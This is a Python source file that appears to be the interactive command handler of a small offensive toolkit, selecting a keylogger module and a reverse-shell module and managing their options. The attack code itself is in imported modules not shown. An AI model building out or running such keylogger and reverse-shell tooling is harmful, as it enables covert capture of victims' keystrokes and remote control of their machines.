import logger
import shell
import sys

# TODO separate the handler's args from the keylogger args
# 1. Imlement OS commands/ shell module

class Handler:
    def __init__(self, args):
        self.args = args
        self.module = ""
        self.module_str = ""

    def start(self):
        while True:
            command = str(input(f"{self.module_str} >> "))
            self.handle_command(command)

    # bad code :)
    def handle_command(self, command):
        if command[:3] == "USE" or command[0:3] == "use":
            module = command[4:]
            if module == "logger":
                self.module = logger.Keylogger(self.args)
                self.module_str = "logger"
            elif module == "shell":
                self.module = shell.Shell(self.args)
                self.module_str = "shell"
            return

        if command == "help":
            self.print_help()
            return

        if type(self.module) == logger.Keylogger:
            if command == "start" or command == "run":
                self.module.start()

        if type(self.module) == shell.Shell:
            if command == "start" or command == "run":
                self.module.start()

        if command[:7] == "options":
            if self.module == "":
                print("No module selected")
                return
            cmd_array = command.split(' ')
            if len(cmd_array) > 1 and cmd_array[1] == "set":
                self.module.update_options(cmd_array[2], cmd_array[3])
            else:
                self.module.print_options()
            return

        if command == "exit" or command == "quit":
            sys.exit(0)

    def print_help(self):
        help_payload = ""
        help_payload += """
    help            - Displays this message
    USE <module>    - Select the module to use

    Modules
        logger      - keylogger tools, listener and client
            start   - Starts the keylogger module
            options - view and edit the current options
                options set <option> <value>
        shell       - creates a reverse shell
            start   - Starts the module
            options - view and edit the current options
        """

        print(help_payload)
